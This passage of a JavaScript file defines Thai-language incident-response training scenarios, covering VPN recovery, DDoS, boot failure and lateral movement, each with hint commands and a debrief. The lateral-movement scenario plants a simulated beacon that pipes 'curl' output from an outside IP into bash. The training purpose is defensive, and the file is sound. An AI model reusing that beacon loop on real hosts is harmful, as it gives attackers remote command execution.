      { t: 'สแกนพอร์ตที่เปิดอยู่บนเครื่องนี้', hint: 'nmap 192.168.10.20', check: (s, h) => said(h, /^nmap/i) },
      { t: 'ตรวจ log การยืนยันตัวตนหาสิ่งผิดปกติ', hint: 'grep "Failed password" /var/log/auth.log', check: (s, h) => said(h, /grep.*auth\.log/i) },
      { t: '<b>Containment:</b> บล็อกขาออกพอร์ต 25 ชั่วคราว — ตั้ง firewall deny incoming ก่อน', hint: 'sudo ufw default deny incoming', check: (s, h) => said(h, /ufw\s+default\s+deny/i) },
      { t: 'อนุญาต SSH ไม่ให้ตัวเองหลุด', hint: 'sudo ufw allow 22/tcp', check: s => s.ufw.rules.some(r => /22/.test(r.to)) },
      { t: 'เปิด firewall', hint: 'sudo ufw enable', check: s => s.ufw.active },
      { t: 'เปิด fail2ban ป้องกันการเดารหัสเพิ่ม', hint: 'sudo systemctl start fail2ban → sudo systemctl enable fail2ban', check: s => s.services.fail2ban.active },
      { t: 'สแกนหา rootkit', hint: 'sudo rkhunter --check', check: (s, h) => said(h, /rkhunter/i) },
      { t: 'บันทึกหลักฐานลง <code>/home/analyst/mail-incident.txt</code>', hint: 'ss -tulpn > /home/analyst/mail-incident.txt', check: s => (node(s, '/home/analyst/mail-incident.txt')?.content || '').length > 10 },
    ],
    debrief: 'การติด blacklist เกือบทั้งหมดมาจาก 3 สาเหตุ: (1) เครื่องในบริษัทติดมัลแวร์แล้วส่งสแปม (2) <b>open relay</b> — mail server ยอมให้คนนอกส่งผ่าน (3) บัญชีอีเมลถูกยึดแล้วใช้ส่งสแปม สิ่งที่ต้องทำคือหยุดต้นตอก่อน แล้วค่อยขอ delist — ถ้าขอ delist ทั้งที่ยังส่งสแปมอยู่ จะโดนขึ้นบัญชีดำซ้ำและถอดยากขึ้นเรื่อย ๆ ป้องกันระยะยาวด้วย SPF, DKIM, DMARC และบล็อกพอร์ต 25 ขาออกจากทุกเครื่องยกเว้น mail server',
  },

  {
    id: 'sv-backup-fail',
    title: 'Backup ล้มเหลวมา 3 สัปดาห์ ไม่มีใครรู้',
    icon: '💿',
    difficulty: 'medium', severity: 'critical', time: '20 นาที',
    caller: 'ผู้ตรวจสอบภายใน',
    story: 'ผู้ตรวจสอบภายในขอดูรายงาน backup ล่าสุด พอเปิดดูพบว่า job ล้มเหลวติดต่อกันมา 3 สัปดาห์ อีเมลแจ้งเตือนถูกส่งไปที่เมลของพนักงานที่ลาออกไปแล้ว จึงไม่มีใครเห็น',
    impact: 'ถ้าเกิดเหตุตอนนี้จะกู้ข้อมูลไม่ได้เลย 3 สัปดาห์',
    device: 'linux',
    tasks: [
      { t: 'ตรวจพื้นที่ปลายทางที่ใช้เก็บ backup', hint: 'df -h', check: (s, h) => said(h, /^(sudo\s+)?df\s+-h/i) },
      { t: 'ตรวจว่า inode เต็มหรือไม่', hint: 'df -i', check: (s, h) => said(h, /df\s+-i/i) },
      { t: 'ดูว่ามีอะไรอยู่ในโฟลเดอร์ backup บ้าง', hint: 'ls -la /backup', check: (s, h) => said(h, /ls\s+.*\/backup/i) },
      { t: 'ตรวจ cron job ที่ควรรัน backup', hint: 'crontab -l', check: (s, h) => said(h, /crontab\s+-l/i) },
      { t: 'ตรวจสิทธิ์ของสคริปต์ backup', hint: 'ls -la /home/student/scripts', check: (s, h) => said(h, /ls\s+.*scripts/i) },
      { t: 'ให้สิทธิ์รันแก่สคริปต์ backup', hint: 'chmod +x /home/student/scripts/backup.sh', check: s => { const f = node(s, '/home/student/scripts/backup.sh'); return f && /[1357]/.test(f.mode[0]); } },
      { t: 'ตรวจ log ระบบหาสาเหตุที่ job ล้ม', hint: 'journalctl -p err', check: (s, h) => said(h, /journalctl/i) },
      { t: 'สร้างโฟลเดอร์ปลายทางให้ครบ <code>/backup/daily</code>', hint: 'sudo mkdir -p /backup/daily', check: s => !!node(s, '/backup/daily') },
      { t: 'ทดสอบเขียนไฟล์ลงปลายทางได้จริง', hint: 'echo "test" > /backup/daily/test.txt', check: s => (node(s, '/backup/daily/test.txt')?.content || '').length > 0 },
      { t: 'ตรวจว่าเวลาเครื่องตรง (สำคัญกับ job ตามเวลา)', hint: 'timedatectl', check: (s, h) => said(h, /^timedatectl/i) },
      { t: 'บันทึกรายงานสถานะลง <code>/backup/status.txt</code>', hint: 'df -h > /backup/status.txt', check: s => (node(s, '/backup/status.txt')?.content || '').length > 10 },
    ],
    debrief: 'ปัญหาจริงในเคสนี้ไม่ใช่ "backup ล้ม" แต่คือ <b>"ล้มแล้วไม่มีใครรู้"</b> — ระบบแจ้งเตือนที่ส่งไปยังเมลของคนที่ลาออกแล้วเท่ากับไม่มีระบบแจ้งเตือน สิ่งที่ต้องมี: (1) แจ้งเตือนเข้า <b>กลุ่ม</b> ไม่ใช่บุคคล (2) <b>alert เมื่อไม่มี backup สำเร็จเกิน X ชั่วโมง</b> ไม่ใช่แค่ alert ตอนล้ม เพราะถ้า job ไม่รันเลยก็จะไม่มี alert (3) ทดสอบ restore จริงอย่างน้อยปีละครั้ง — backup ที่ไม่เคยกู้ ถือว่าไม่มี',
  },

  // ============ ยาก ============
  {
    id: 'sv-vpn-down',
    title: 'พนักงาน WFH เข้า VPN ไม่ได้ทั้งบริษัท',
    icon: '🌏',
    difficulty: 'hard', severity: 'critical', time: '20 นาที',
    caller: 'ฝ่ายบุคคล',
    story: 'เช้าวันจันทร์ พนักงาน work from home 60 คนเข้า VPN ไม่ได้เลย ขึ้น timeout ทุกคน เมื่อคืนทีมเน็ตเวิร์กเพิ่งอัปเดต firmware router สาขาใหญ่',
    impact: 'พนักงาน 60 คนทำงานไม่ได้ตั้งแต่เช้า',
    device: 'mikrotik',
    init: {
      apply: st => {
        st.tables['ip address'].push({ _id: '*60', address: '192.168.88.1/24', network: '192.168.88.0', interface: 'ether2', disabled: false });
        st.tables['ip route'].push({ _id: '*61', 'dst-address': '0.0.0.0/0', gateway: '203.0.113.1', distance: '1', disabled: false });
        // firmware update ทำให้ config VPN หาย
      },
    },
    tasks: [
      { t: 'ตรวจ interface ทั้งหมดว่ามี VPN interface เหลืออยู่ไหม', hint: '/interface print', check: (s, h) => said(h, /interface\s+print/i) },
      { t: 'ตรวจว่ามี WireGuard interface หรือไม่', hint: '/interface wireguard print', check: (s, h) => said(h, /wireguard\s+print/i) },
      { t: 'สร้าง WireGuard interface <code>wg0</code> ขึ้นมาใหม่ listen-port <code>13231</code>', hint: '/interface wireguard add name=wg0 listen-port=13231', check: s => has(s, 'interface wireguard', r => r.name === 'wg0') },
      { t: 'ใส่ IP <code>10.99.0.1/24</code> ให้ <code>wg0</code>', hint: '/ip address add address=10.99.0.1/24 interface=wg0', check: s => has(s, 'ip address', r => r.address === '10.99.0.1/24' && r.interface === 'wg0') },
      { t: 'สร้าง IP pool สำหรับ VPN client', hint: '/ip pool add name=vpn_pool ranges=10.99.0.10-10.99.0.200', check: s => has(s, 'ip pool', r => r.name === 'vpn_pool') },
      { t: 'ตรวจ firewall ว่าเปิดพอร์ต VPN ไว้ไหม', hint: '/ip firewall filter print', check: (s, h) => said(h, /firewall\s+filter\s+print/i) },
      { t: 'เปิด firewall input ให้ UDP <code>13231</code> เข้าได้', hint: '/ip firewall filter add chain=input protocol=udp dst-port=13231 action=accept', check: s => has(s, 'ip firewall filter', r => r.chain === 'input' && r.action === 'accept' && String(r['dst-port']) === '13231') },
      { t: 'อนุญาต forward จาก VPN เข้า LAN', hint: '/ip firewall filter add chain=forward in-interface=wg0 action=accept', check: s => has(s, 'ip firewall filter', r => r.chain === 'forward' && r['in-interface'] === 'wg0') },
      { t: 'เพิ่ม peer ของสาขา/ผู้ใช้กลับเข้ามา', hint: '/interface wireguard peers add interface=wg0 public-key="RestoredKey123=" allowed-address=10.99.0.2/32', check: s => has(s, 'interface wireguard peers', r => r.interface === 'wg0') },
      { t: 'ตรวจ NAT ว่ายังมี masquerade อยู่', hint: '/ip firewall nat print', check: (s, h) => said(h, /firewall\s+nat\s+print/i) },
      { t: 'ดึง config ออกมาเก็บทันทีหลังกู้เสร็จ', hint: '/export', check: (s, h) => said(h, /^\/?export/i) },
      { t: 'ตั้ง scheduler สำรอง config อัตโนมัติทุกวัน', hint: '/system scheduler add name=daily-backup interval=1d on-event="/export file=daily"', check: s => has(s, 'system scheduler', r => String(r.interval) === '1d') },
    ],
    debrief: 'การอัปเกรด firmware แล้ว config บางส่วนหายเป็นเรื่องที่เกิดได้จริง โดยเฉพาะเมื่อข้ามเวอร์ชันหลัก (เช่น RouterOS 6 → 7 ที่โครงสร้างเมนู routing เปลี่ยน) <b>บทเรียนสำคัญ: ต้อง export config เป็นไฟล์ข้อความก่อนอัปเกรดเสมอ</b> เพราะไฟล์ backup แบบ binary กู้ข้ามเวอร์ชันไม่ได้ และควรอัปเกรดใน maintenance window พร้อมมีแผนถอยกลับ ไม่ใช่คืนวันอาทิตย์ก่อนวันทำงาน',
  },

  {
    id: 'sv-ddos',
    title: 'Traffic ผิดปกติถล่มเข้ามา — เว็บล่ม',
    icon: '🌊',
    difficulty: 'hard', severity: 'critical', time: '15 นาที',
    caller: 'ระบบ Monitoring',
    story: 'กราฟ traffic ขาเข้าพุ่งจาก 20 Mbps เป็น 900 Mbps ภายใน 3 นาที เว็บล่ม CPU ของ router 100% ทีมสงสัยว่าโดน DDoS หรือมี DNS amplification ที่ใช้ router เราเป็นเครื่องมือ',
    impact: 'เว็บและระบบทั้งหมดที่อยู่หลัง router นี้ใช้งานไม่ได้',
    device: 'mikrotik',
    init: {
      apply: st => {
        st.settings['ip dns']['allow-remote-requests'] = 'yes';
        st.tables['ip address'].push({ _id: '*50', address: '203.0.113.25/29', network: '203.0.113.24', interface: 'ether1', disabled: false });
      },
    },
    tasks: [
      { t: 'ตรวจสถานะเครื่องว่า CPU สูงจริงไหม', hint: '/system resource print', check: (s, h) => said(h, /system\s+resource\s+print/i) },
      { t: 'ตรวจการตั้งค่า DNS — จุดที่มักถูกใช้เป็นเครื่องมือโจมตี', hint: '/ip dns print', check: (s, h) => said(h, /ip\s+dns\s+print/i) },
      { t: '<b>ปิดช่องทันที:</b> ปิด <code>allow-remote-requests</code>', hint: '/ip dns set allow-remote-requests=no', check: s => s.settings['ip dns']['allow-remote-requests'] === 'no' },
      { t: 'สร้าง interface list <code>WAN</code>', hint: '/interface list add name=WAN', check: s => has(s, 'interface list', r => r.name === 'WAN') },
      { t: 'เพิ่ม <code>ether1</code> เข้า list <code>WAN</code>', hint: '/interface list member add list=WAN interface=ether1', check: s => has(s, 'interface list member', r => r.list === 'WAN' && r.interface === 'ether1') },
      { t: 'บล็อก DNS (พอร์ต 53) ที่เข้ามาจากฝั่ง WAN', hint: '/ip firewall filter add chain=input in-interface-list=WAN protocol=udp dst-port=53 action=drop', check: s => has(s, 'ip firewall filter', r => r.chain === 'input' && r.action === 'drop' && String(r['dst-port']) === '53') },
      { t: 'เพิ่มกฎ input: accept established,related ไว้บนสุด', hint: '/ip firewall filter add chain=input connection-state=established,related action=accept', check: s => has(s, 'ip firewall filter', r => r.chain === 'input' && r.action === 'accept' && /established/.test(r['connection-state'] || '')) },
      { t: 'drop connection-state invalid', hint: '/ip firewall filter add chain=input connection-state=invalid action=drop', check: s => has(s, 'ip firewall filter', r => r.chain === 'input' && r.action === 'drop' && /invalid/.test(r['connection-state'] || '')) },
      { t: 'ใส่ IP ต้นทางที่โจมตีลง address-list <code>attackers</code>', hint: '/ip firewall address-list add list=attackers address=45.9.148.0/24', check: s => has(s, 'ip firewall address-list', r => r.list === 'attackers') },
      { t: 'drop traffic จาก <code>attackers</code> ตั้งแต่ chain raw (ประหยัด CPU ที่สุด)', hint: '/ip firewall raw add chain=prerouting src-address-list=attackers action=drop', check: s => has(s, 'ip firewall raw', r => r.action === 'drop' && r['src-address-list'] === 'attackers') },
      { t: 'ตรวจสถานะ CPU อีกครั้งหลังใส่กฎ', hint: '/system resource print', check: (s, h) => h.filter(c => /system\s+resource\s+print/i.test(c)).length >= 2 },
    ],
    debrief: 'สองเรื่องที่ต้องแยกให้ออก: <b>เราเป็นเหยื่อ</b> หรือ <b>เราเป็นเครื่องมือ</b> — router ที่เปิด <code>allow-remote-requests=yes</code> โดยไม่บล็อกพอร์ต 53 จากฝั่ง WAN จะถูกใช้ทำ DNS amplification ยิงคนอื่น และ traffic ที่เห็นคือ traffic ที่วิ่งผ่านเรา การใช้ <b>chain=raw</b> ดักทิ้งตั้งแต่ prerouting ประหยัด CPU กว่า filter มาก เพราะยังไม่เข้า connection tracking ส่วนการโจมตีระดับที่ล้นแบนด์วิดท์ขาเข้าจริง ๆ ต้องให้ ISP หรือบริการ scrubbing ช่วยกรองต้นทาง เพราะแก้ที่ปลายทางไม่ทัน',
  },

  {
    id: 'sv-boot-fail',
    title: 'เซิร์ฟเวอร์บูตไม่ขึ้นหลัง Windows Update',
    icon: '💀',
    difficulty: 'hard', severity: 'critical', time: '25 นาที',
    caller: 'ทีม NOC',
    story: 'หลัง Windows Update คืนวันเสาร์ เซิร์ฟเวอร์ตัวหลักบูตค้างที่หน้าจอ recovery ตอนนี้บูตเข้า Safe Mode ได้แล้วและมี Command Prompt ใช้ ผู้บริหารถามทุก 10 นาทีว่าเสร็จเมื่อไร',
    impact: 'ระบบหลักขององค์กรใช้งานไม่ได้ตั้งแต่เช้า',
    device: 'windows',
    init: { hostname: 'SRV-APP01' },
    tasks: [
      { t: 'ตรวจข้อมูลระบบและ build ปัจจุบัน', hint: 'systeminfo', check: (s, h) => said(h, /^systeminfo/i) },
      { t: 'ตรวจเวอร์ชัน Windows', hint: 'ver', check: (s, h) => said(h, /^ver\s*$/i) },
      { t: 'ตรวจสอบความสมบูรณ์ของไฟล์ระบบ', hint: 'sfc /scannow', check: (s, h) => said(h, /^sfc/i) },
      { t: 'ตรวจสอบดิสก์ว่าเสียหายไหม', hint: 'chkdsk', check: (s, h) => said(h, /^chkdsk/i) },
      { t: 'ตรวจ event log หาสาเหตุ', hint: 'Get-EventLog -LogName System', check: (s, h) => said(h, /get-eventlog|get-winevent/i) },
      { t: 'ตรวจไดรเวอร์ที่ติดตั้งอยู่', hint: 'driverquery', check: (s, h) => said(h, /^driverquery/i) },
      { t: 'ตรวจ service ที่ตั้งให้เริ่มอัตโนมัติแต่ไม่ทำงาน', hint: 'Get-Service', check: (s, h) => said(h, /^(get-service|gsv)/i) },
      { t: 'ปิด service ที่สงสัยว่าทำให้บูตค้าง (<code>W3SVC</code>) ไม่ให้เริ่มอัตโนมัติ', hint: 'sc config W3SVC start= disabled', check: s => /disabled/i.test(s.services.W3SVC.start) },
      { t: 'ตรวจพื้นที่ดิสก์ (update ต้องการที่ว่าง)', hint: 'wmic logicaldisk get', check: (s, h) => said(h, /^wmic/i) },
      { t: 'ตรวจว่าเครือข่ายยังทำงาน', hint: 'ipconfig /all', check: (s, h) => said(h, /^ipconfig\s*\/all/i) },
      { t: 'ตรวจ scheduled task ที่อาจรันตอนบูต', hint: 'schtasks /query', check: (s, h) => said(h, /schtasks\s*\/query/i) },
      { t: 'สร้าง firewall rule เปิด RDP ให้เข้ามาแก้ไขระยะไกลได้', hint: 'New-NetFirewallRule -DisplayName "Allow-RDP" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389', check: s => s.fwRules.some(r => /Allow-RDP/i.test(r.name)) },
      { t: 'เปิด service <code>TermService</code> เพื่อ remote เข้ามาทำงานต่อ', hint: 'Start-Service -Name TermService', check: s => s.services.TermService.status === 'Running' },
    ],
    debrief: 'Windows Update ที่ทำให้บูตไม่ขึ้นมักเกิดจาก<b>ไดรเวอร์ที่ไม่เข้ากัน</b>หรือ<b>ดิสก์เต็มระหว่างติดตั้ง</b> ลำดับที่ควรทำคือ: บูต Safe Mode → ดู Event log หา error ตอนบูต → ปิด service/driver ที่สงสัย → ถ้ายังไม่ได้ให้ uninstall update ตัวล่าสุด (<code>wusa /uninstall</code>) หรือ System Restore <b>บทเรียนเชิงระบบ:</b> อย่าให้ระบบสำคัญอัปเดตอัตโนมัติทันทีที่ patch ออก — ควรมีกลุ่มนำร่องทดสอบก่อน 1-2 สัปดาห์ และมี snapshot/backup ก่อนอัปเดตเสมอ',
  },

  {
    id: 'sv-stack-fail',
    title: 'Switch Stack สมาชิกตัวหลักดับกลางวัน',
    icon: '🧱',
    difficulty: 'hard', severity: 'critical', time: '20 นาที',
    caller: 'ทีม NOC',
    story: 'สวิตช์ตัว master ใน stack ดับกะทันหันตอนบ่ายสอง ตัวที่เหลือรับช่วงต่อได้แต่ config บางส่วนหาย พอร์ตหลายตัวกลับไปอยู่ VLAN 1 และ uplink ไม่ขึ้น ผู้ใช้ครึ่งตึกใช้งานไม่ได้',
    impact: 'ผู้ใช้ครึ่งอาคารใช้งานเครือข่ายไม่ได้',
    device: 'cisco',
    init: {
      apply: st => {
        st.vlans[10] = { id: 10, name: 'OFFICE' };
        st.vlans[20] = { id: 20, name: 'SERVER' };
        st.vlans[99] = { id: 99, name: 'MGMT' };
        ran(1, 12).forEach(i => { st.ifaces[F(i)].accessVlan = 1; st.ifaces[F(i)].swMode = 'dynamic'; st.ifaces[F(i)].link = true; });
        st.ifaces[G(1)].shutdown = true;
        st.ifaces[G(2)].shutdown = true;
      },
    },
    tasks: [
      { t: 'เข้า privileged mode', hint: 'enable', check: s => s.mode !== 'user' },
      { t: 'ตรวจสถานะพอร์ตทั้งหมด', hint: 'show interfaces status', check: (s, h) => said(h, /^(do\s+)?sh(ow)?\s+int\w*\s+st/i) },
      { t: 'ตรวจว่ามี VLAN อะไรเหลืออยู่บ้าง', hint: 'show vlan brief', check: (s, h) => said(h, /^(do\s+)?sh(ow)?\s+vlan/i) },
      { t: 'เปิด uplink Gi0/1 และ Gi0/2 ที่ถูกปิด', hint: 'configure terminal → interface range gi0/1 - 2 → no shutdown', check: s => !s.ifaces[G(1)].shutdown && !s.ifaces[G(2)].shutdown },
      { t: 'รวม uplink เป็น EtherChannel กลุ่ม 1 (LACP active)', hint: 'channel-group 1 mode active', check: s => [G(1), G(2)].every(n => s.ifaces[n].channel && s.ifaces[n].channel.mode === 'active') },
      { t: 'ตั้ง Port-channel1 เป็น trunk', hint: 'exit → interface port-channel 1 → switchport mode trunk', check: s => s.ifaces['Port-channel1'] && s.ifaces['Port-channel1'].swMode === 'trunk' },
      { t: 'จำกัด allowed vlan เป็น 10,20,99', hint: 'switchport trunk allowed vlan 10,20,99', check: s => { const a = (s.ifaces['Port-channel1'] || {}).allowed || ''; return /10/.test(a) && /20/.test(a) && /99/.test(a); } },
      { t: 'คืนพอร์ตผู้ใช้ Fa0/1-12 กลับเป็น access VLAN 10', hint: 'exit → interface range fa0/1 - 12 → switchport mode access → switchport access vlan 10', check: s => ran(1, 12).every(i => s.ifaces[F(i)].swMode === 'access' && s.ifaces[F(i)].accessVlan === 10) },
      { t: 'เปิด portfast และ bpduguard ที่พอร์ตผู้ใช้', hint: 'spanning-tree portfast → spanning-tree bpduguard enable', check: s => ran(1, 12).every(i => s.ifaces[F(i)].portfast && s.ifaces[F(i)].bpduguard) },
      { t: 'ตั้ง SVI VLAN 99 = <code>192.168.99.12/24</code> เพื่อ remote เข้ามาได้', hint: 'exit → interface vlan 99 → ip address 192.168.99.12 255.255.255.0 → no shutdown', check: s => s.svis[99] && s.svis[99].ip === '192.168.99.12' && !s.svis[99].shutdown },
      { t: 'ตั้ง default gateway', hint: 'exit → ip default-gateway 192.168.99.1', check: s => s.defaultGw === '192.168.99.1' },
      { t: '<b>บันทึก config ทันที</b> ไม่ให้หายอีก', hint: 'end → write memory', check: s => !!s.savedConfig },
    ],
    debrief: 'สาเหตุที่ config หายคือ <b>ตัว master ถือ config ของทั้ง stack ไว้</b> และ config ที่แก้ล่าสุดยังไม่ได้ <code>write memory</code> ก่อนที่มันจะดับ — สมาชิกตัวใหม่ที่ขึ้นมาเป็น master จึงใช้ config เก่าที่เซฟไว้ครั้งล่าสุด <b>บทเรียน:</b> เซฟทุกครั้งหลังแก้ config เสมอ, ตั้ง <code>archive</code> ให้เก็บ config อัตโนมัติ, กำหนด stack priority ให้ชัดว่าใครควรเป็น master และเก็บสำเนา config ของทุกตัวไว้นอกอุปกรณ์',
  },

  // ============ โหด ============
  {
    id: 'sv-lateral',
    title: 'ผู้โจมตีเคลื่อนที่อยู่ในเครือข่ายแล้ว',
    icon: '🕸️',
    difficulty: 'insane', severity: 'critical', time: '30 นาที',
    caller: 'ทีม SOC',
    story: 'SOC แจ้งว่าตรวจพบการเชื่อมต่อผิดปกติจากเครื่อง 3 เครื่องไปยัง IP ต่างประเทศเดียวกันทุก 5 นาที และมีการล็อกอินด้วยบัญชี admin จากเครื่องผู้ใช้ธรรมดา — สัญญาณของ lateral movement ที่กำลังดำเนินอยู่',
    impact: 'ผู้โจมตีอยู่ในระบบแล้วและกำลังขยายวง — เสี่ยงถูกเข้ารหัสทั้งองค์กรภายในไม่กี่ชั่วโมง',
    device: 'linux-sec',
    init: {
      apply: st => {
        st.fs.children.tmp.children['.beacon'] = { t: 'f', mode: '755', owner: 'root', group: 'root', content: '#!/bin/bash\nwhile true; do curl -s http://45.9.148.3/cmd | bash; sleep 300; done\n' };
        st.users.support_svc = { uid: 1401, home: '/home/support_svc', shell: '/bin/bash', groups: ['support_svc', 'sudo'] };
        const pw = st.fs.children.etc.children.passwd;
        pw.content += 'support_svc:x:1401:1401::/home/support_svc:/bin/bash\n';
      },
    },
    tasks: [
      { t: 'ตรวจการเชื่อมต่อเครือข่ายที่เปิดอยู่', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
      { t: 'ตรวจ process ที่กำลังทำงาน', hint: 'ps aux', check: (s, h) => said(h, /^(sudo\s+)?ps\s/i) },
      { t: 'ดักจับ traffic เพื่อยืนยันการติดต่อ C2', hint: 'sudo tcpdump -i ens33', check: (s, h) => said(h, /tcpdump/i) },
      { t: 'ตรวจไฟล์ซ่อนใน <code>/tmp</code>', hint: 'ls -la /tmp', check: (s, h) => said(h, /ls\s+-l?a/i) },
      { t: 'อ่านเนื้อหาไฟล์ beacon ที่พบ', hint: 'cat /tmp/.beacon', check: (s, h) => said(h, /cat\s+\/tmp\/\.beacon/i) },
      { t: 'ทำ hash ของไฟล์เป็น IOC เพื่อค้นหาในเครื่องอื่น', hint: 'sha256sum /tmp/.beacon', check: (s, h) => said(h, /sha256sum/i) },
      { t: 'ตรวจบัญชีผู้ใช้ทั้งหมดหาบัญชีแปลกปลอม', hint: 'cat /etc/passwd | cut -d: -f1', check: (s, h) => said(h, /cut\s+-d/i) },
      { t: 'ตรวจว่าใครล็อกอินสำเร็จบ้างและจากที่ไหน', hint: 'grep Accepted /var/log/auth.log', check: (s, h) => said(h, /grep.*accepted/i) },
      { t: 'ดู IP ที่พยายามเดารหัสมากที่สุดด้วย pipeline', hint: 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn', check: (s, h) => said(h, /awk.*\|\s*sort\s*\|\s*uniq/i) },
      { t: '<b>Containment:</b> ตั้ง firewall default deny incoming', hint: 'sudo ufw default deny incoming', check: (s, h) => said(h, /ufw\s+default\s+deny/i) },
      { t: 'อนุญาต SSH เฉพาะเพื่อไม่ให้ตัวเองหลุด', hint: 'sudo ufw allow 22/tcp', check: s => s.ufw.rules.some(r => /22/.test(r.to)) },
      { t: 'เปิด firewall', hint: 'sudo ufw enable', check: s => s.ufw.active },
      { t: 'เปิด auditd เพื่อเก็บหลักฐานทุกอย่างจากนี้ไป', hint: 'sudo systemctl start auditd → sudo systemctl enable auditd', check: s => s.services.auditd.active && s.services.auditd.enabled },
      { t: 'เพิ่ม audit rule เฝ้าไฟล์ <code>/etc/passwd</code>', hint: 'sudo auditctl -w /etc/passwd -p wa -k identity', check: (s, h) => said(h, /auditctl\s+-w/i) },
      { t: 'สแกนหา rootkit', hint: 'sudo rkhunter --check', check: (s, h) => said(h, /rkhunter/i) },
      { t: 'ตรวจความถูกต้องของไฟล์ระบบ', hint: 'sudo aide --check', check: (s, h) => said(h, /aide/i) },
      { t: 'สร้างโฟลเดอร์หลักฐานและบันทึก process list', hint: 'sudo mkdir -p /mnt/evidence → ps aux > /mnt/evidence/process.txt', check: s => (node(s, '/mnt/evidence/process.txt')?.content || '').length > 10 },
      { t: 'บันทึกการเชื่อมต่อเครือข่ายเป็นหลักฐาน', hint: 'ss -tulpn > /mnt/evidence/network.txt', check: s => (node(s, '/mnt/evidence/network.txt')?.content || '').length > 10 },
    ],
    debrief: 'Lateral movement คือช่วงที่<b>อันตรายที่สุดและมีเวลาน้อยที่สุด</b> — ผู้โจมตีเข้ามาแล้วและกำลังหาทางไปยัง Domain Controller ก่อนจะปล่อย ransomware สิ่งที่ต้องตัดสินใจเร็วคือ: แยกเครื่องที่ติดออกจากเครือข่าย, <b>รีเซ็ตรหัสผ่านบัญชีที่มีสิทธิ์สูงทั้งหมด</b> และรีเซ็ต krbtgt สองครั้ง, ตรวจทุกเครื่องด้วย IOC ที่ได้ (hash, IP ของ C2) <b>สิ่งที่ห้ามทำ:</b> อย่ารีบลบไฟล์มัลแวร์ทีละเครื่องแบบไล่ตาม เพราะผู้โจมตีจะรู้ตัวและเร่งปล่อย ransomware ทันที ควรวางแผนตัดพร้อมกันทีเดียว',
  },

  {
    id: 'sv-datacenter',
    title: 'ไฟดับทั้งห้อง Server — UPS หมดใน 20 นาที',
    icon: '⚡',
    difficulty: 'insane', severity: 'critical', time: '20 นาที',
    caller: 'รปภ. อาคาร',
    story: 'รปภ. โทรมาบอกว่าไฟดับทั้งอาคารและการไฟฟ้าแจ้งว่าจะกลับมาใน 2 ชั่วโมง UPS ในห้อง server รองรับได้อีกประมาณ 20 นาทีเท่านั้น เครื่องปั่นไฟไม่ได้ทดสอบมา 8 เดือน คุณต้องตัดสินใจว่าจะ shutdown อะไรก่อนหลัง',
    impact: 'ถ้า UPS หมดโดยไม่ได้ shutdown อย่างถูกวิธี ฐานข้อมูลอาจเสียหายและกู้ไม่ได้',
    device: 'linux',
    init: {
      hostname: 'srv-core01',
      // โจทย์บอกให้ไล่ปิด container ตามลำดับ — เครื่องจึงต้องมี container ทำงานอยู่จริงตั้งแต่แรก
      apply: st => {
        st.containers.push({ name: 'web', image: 'nginx:1.25', state: 'Up', ports: '0.0.0.0:80->80/tcp' });
        st.containers.push({ name: 'db', image: 'postgres:15', state: 'Up', ports: '5432/tcp' });
      },
    },
    tasks: [
      { t: 'ตรวจสถานะเครื่องและ uptime ก่อน', hint: 'uptime', check: (s, h) => said(h, /^uptime/i) },
      { t: 'ตรวจว่ามี service สำคัญอะไรทำงานอยู่', hint: 'systemctl list-units', check: (s, h) => said(h, /systemctl\s+list-units/i) },
      { t: 'ตรวจพื้นที่ดิสก์ก่อน shutdown (เผื่อ log ไม่พอเขียน)', hint: 'df -h', check: (s, h) => said(h, /^(sudo\s+)?df/i) },
      { t: 'ตรวจว่ามี container ทำงานอยู่ไหม', hint: 'docker ps', check: (s, h) => said(h, /docker\s+ps/i) },
      { t: 'สร้างโฟลเดอร์บันทึกสถานะก่อนดับ <code>/backup/shutdown</code>', hint: 'sudo mkdir -p /backup/shutdown', check: s => !!node(s, '/backup/shutdown') },
      { t: 'บันทึกรายการ service ที่ทำงานอยู่ไว้ใช้ตอน start กลับ', hint: 'systemctl list-units > /backup/shutdown/services.txt', check: s => (node(s, '/backup/shutdown/services.txt')?.content || '').length > 10 },
      { t: 'บันทึกสถานะเครือข่ายไว้ด้วย', hint: 'ip a > /backup/shutdown/network.txt', check: s => (node(s, '/backup/shutdown/network.txt')?.content || '').length > 10 },
      { t: '<b>ลำดับที่ 1:</b> หยุด container ที่ไม่จำเป็นก่อน', hint: 'docker stop web', check: (s, h) => said(h, /docker\s+stop/i) },
      { t: '<b>ลำดับที่ 2:</b> หยุดเว็บเซิร์ฟเวอร์ (ตัดผู้ใช้ใหม่เข้ามา)', hint: 'sudo systemctl stop nginx', check: s => !s.services.nginx.active },
      { t: 'ตรวจว่าไม่มีใครยังเชื่อมต่อค้างอยู่', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
      { t: 'ตรวจว่าใครล็อกอินอยู่ในเครื่อง', hint: 'who', check: (s, h) => said(h, /^who\s*$/i) },
      { t: 'บันทึกเวลาที่เริ่ม shutdown ลง log', hint: 'date > /backup/shutdown/timeline.txt', check: s => (node(s, '/backup/shutdown/timeline.txt')?.content || '').length > 3 },
      { t: 'ตรวจสอบว่าเวลาเครื่องถูกต้อง (สำคัญกับ log ตอนสอบสวนภายหลัง)', hint: 'timedatectl', check: (s, h) => said(h, /^timedatectl/i) },
    ],
    debrief: 'สถานการณ์นี้วัดว่าองค์กร<b>เตรียมตัวไว้ล่วงหน้าหรือไม่</b> ไม่ใช่วัดฝีมือแก้ปัญหาเฉพาะหน้า สิ่งที่ควรมีอยู่ก่อนแล้ว: (1) <b>เอกสารลำดับ shutdown/startup</b> ที่ระบุว่าปิดอะไรก่อนหลัง และเปิดกลับตามลำดับไหน (2) <b>UPS ที่ต่อ NUT/agent</b> ให้สั่ง graceful shutdown อัตโนมัติเมื่อแบตเหลือ X% (3) <b>ทดสอบเครื่องปั่นไฟทุกเดือน</b> ไม่ใช่ 8 เดือนครั้ง (4) รู้ว่าระบบไหนหยุดได้ ระบบไหนหยุดไม่ได้ ลำดับที่ถูกคือ: หยุดตัวรับ traffic ก่อน → หยุด app → หยุด database เป็นลำดับสุดท้าย และเปิดกลับในลำดับย้อนกลับ',
  },

  {
    id: 'sv-double-fault',
    title: 'สองเหตุพร้อมกัน — เน็ตล่มและ AD ล่ม',
    icon: '🌪️',
    difficulty: 'insane', severity: 'critical', time: '30 นาที',
